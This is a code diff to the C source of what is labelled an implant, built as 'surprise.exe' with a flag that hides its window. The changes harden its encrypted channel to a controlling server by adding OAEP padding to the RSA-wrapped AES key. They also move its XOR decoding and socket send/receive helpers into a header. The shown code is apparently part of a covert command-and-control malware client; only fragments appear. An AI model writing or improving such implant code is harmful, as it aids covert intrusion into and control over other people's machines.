@@ -1,5 +1,7 @@
 #include "implant.h"
 #include "AES.h"
+#include "Communication.h"
+
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -s
 // futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
 int main()
@@ -119,6 +121,9 @@ int main()
     ULONG rsaBlobLen = 0; // length of the RSA public key blob received from the server
     BYTE rsaEncrypted[512];
     ULONG rsaEncryptedLen = sizeof(rsaEncrypted);
+    BCRYPT_OAEP_PADDING_INFO oaepInfo = {0};
+    oaepInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;
+
     status = BCryptOpenAlgorithmProvider(&rsaAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
     {
@@ -244,7 +249,7 @@ int main()
         rsaKey,
         pbSecret,
         cbSecret,
-        NULL,
+        &oaepInfo,
         NULL,
         0,
         rsaEncrypted,
@@ -327,7 +332,7 @@ int main()
                         header[1] = (char)((totalLen >> 8) & 0xFF);
                         header[2] = (char)((totalLen >> 16) & 0xFF);
                         header[3] = (char)((totalLen >> 24) & 0xFF);
-                        header[4] = 0x01;  // Type: RSA-encrypted AES key
+                        header[4] = 0x01; // Type: RSA-encrypted AES key
 
                         send_all(soc, header, sizeof(header));
                         send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
@@ -348,7 +353,7 @@ int main()
                         msg_header[1] = (char)((totalLen >> 8) & 0xFF);
                         msg_header[2] = (char)((totalLen >> 16) & 0xFF);
                         msg_header[3] = (char)((totalLen >> 24) & 0xFF);
-                        msg_header[4] = 0x02;  // Type: AES-encrypted data
+                        msg_header[4] = 0x02; // Type: AES-encrypted data
 
                         send_result = send_all(soc, msg_header, sizeof(msg_header));
                         if (send_result > 0)
@@ -393,39 +398,3 @@ int main()
     return 0;
 }
 
-char *decode(char *message, char key, int lenght)
-{
-    for (int i = 0; i < lenght; i++)
-    {
-        message[i] = message[i] ^ key;
-    }
-    return message;
-}
-
-int recv_all(SOCKET sock, char *buff, int len)
-{
-    int received = 0;
-    int total = 0;
-    while (total < len)
-    {
-        received = recv(sock, buff + total, len - total, 0);
-        if (received <= 0)
-            return received;
-        total += received;
-    }
-    return total;
-}
-
-int send_all(SOCKET sock, char *buff, int len)
-{
-    int sent = 0;
-    int total = 0;
-    while (total < len)
-    {
-        sent = send(sock, buff + total, len - total, 0);
-        if (sent <= 0)
-            return sent;
-        total += sent;
-    }
-    return total;
-}
